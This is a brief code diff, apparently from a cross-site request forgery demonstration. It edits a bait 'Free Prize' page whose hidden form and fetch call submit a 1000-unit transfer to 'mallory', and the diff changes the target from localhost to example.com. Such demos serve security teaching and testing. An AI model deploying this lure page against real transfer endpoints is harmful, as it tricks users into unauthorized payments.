@@ -35,7 +35,7 @@ async function handleRequest(
 <body>
   <h1>Free Prize</h1>
   <p>Claim your reward below.</p>
-  <form method="POST" action="http://localhost:3000/transfer">
+  <form method="POST" action="https://example.com/transfer">
     <input type="hidden" name="to" value="mallory" />
     <input type="hidden" name="amount" value="1000" />
     <button type="submit">Claim reward</button>
@@ -58,7 +58,7 @@ async function handleRequest(
       result.textContent = "Sending cross-origin JSON transfer...";
 
       try {
-        const response = await fetch("http://localhost:3000/transfer-json", {
+        const response = await fetch("https://example.com/transfer-json", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
